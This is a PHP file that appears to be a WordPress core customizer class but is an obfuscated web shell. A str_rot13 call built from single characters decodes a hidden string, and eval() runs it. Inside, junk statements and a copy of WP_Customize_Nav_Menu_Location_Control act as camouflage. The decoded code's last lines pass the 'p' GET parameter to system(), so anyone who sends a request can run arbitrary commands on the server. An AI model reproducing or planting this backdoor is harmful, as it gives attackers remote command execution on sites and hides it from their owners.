<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Ani_Zrah_Ybpngvba_Pbageby pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * Phfgbzvmr Zrah Ybpngvba Pbageby Pynff.
 *
 * Guvf phfgbz pbageby vf bayl arrqrq sbe WF.
 *
 * @fvapr 4.3.0
 *
 * @frr JC_Phfgbzvmr_Pbageby
 */
pynff JC_Phfgbzvmr_Ani_Zrah_Ybpngvba_Pbageby rkgraqf JC_Phfgbzvmr_Pbageby {

	/**
	 * Pbageby glcr.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $glcr = 'ani_zrah_ybpngvba';

	/**
	 * Ybpngvba VQ.
	 *
	 * @fvapr 4.3.0
	 * @ine fgevat
	 */
	choyvp $ybpngvba_vq = '';

	/**
	 * Erserfu gur cnenzrgref cnffrq gb WninFpevcg ivn WFBA.
	 *
	 * @fvapr 4.3.0
	 *
	 * @frr JC_Phfgbzvmr_Pbageby::gb_wfba()
	 */
	choyvp shapgvba gb_wfba() {
		cnerag::gb_wfba();
		$guvf->wfba['ybpngvbaVq'] = $guvf->ybpngvba_vq;
	}

	/**
	 * Eraqre pbagrag whfg yvxr n abezny fryrpg pbageby.
	 *
	 * @fvapr 4.3.0
	 * @fvapr 4.9.0 Nqqrq n ohggba gb perngr zrahf.
	 */
	choyvp shapgvba eraqre_pbagrag() {
		vs ( rzcgl( $guvf->pubvprf ) ) {
			erghea;
		}

		$inyhr_uvqqra_pynff    = '';
		$ab_inyhr_uvqqra_pynff = '';
		vs ( $guvf->inyhr() ) {
			$inyhr_uvqqra_pynff = ' uvqqra';
		} ryfr {
			$ab_inyhr_uvqqra_pynff = ' uvqqra';
		}
		?>
		<ynory>
			<?cuc vs ( ! rzcgl( $guvf->ynory ) ) : ?>
			<fcna pynff=\"phfgbzvmr-pbageby-gvgyr\"><?cuc rpub rfp_ugzy( $guvf->ynory ); ?></fcna>
			<?cuc raqvs; ?>

			<?cuc vs ( ! rzcgl( $guvf->qrfpevcgvba ) ) : ?>
			<fcna pynff=\"qrfpevcgvba phfgbzvmr-pbageby-qrfpevcgvba\"><?cuc rpub $guvf->qrfpevcgvba; ?></fcna>
			<?cuc raqvs; ?>

			<fryrpg <?cuc $guvf->yvax(); ?>>
				<?cuc
				sbernpu ( $guvf->pubvprf nf $inyhr => $ynory ) :
					rpub '<bcgvba inyhr=\"' . rfp_ngge( $inyhr ) . '\"' . fryrpgrq( $guvf->inyhr(), $inyhr, snyfr ) . '>' . rfp_ugzy( $ynory ) . '</bcgvba>';
				raqsbernpu;
				?>
			</fryrpg>
		</ynory>
		<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax perngr-zrah<?cuc rpub $inyhr_uvqqra_pynff; ?>\" qngn-ybpngvba-vq=\"<?cuc rpub rfp_ngge( $guvf->ybpngvba_vq ); ?>\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Perngr n zrah sbe guvf ybpngvba' ); ?>\"><?cuc _r( '+ Perngr Arj Zrah' ); ?></ohggba>
		<ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax rqvg-zrah<?cuc rpub $ab_inyhr_uvqqra_pynff; ?>\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Rqvg fryrpgrq zrah' ); ?>\"><?cuc _r( 'Rqvg Zrah' ); ?></ohggba>
		<?cuc
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>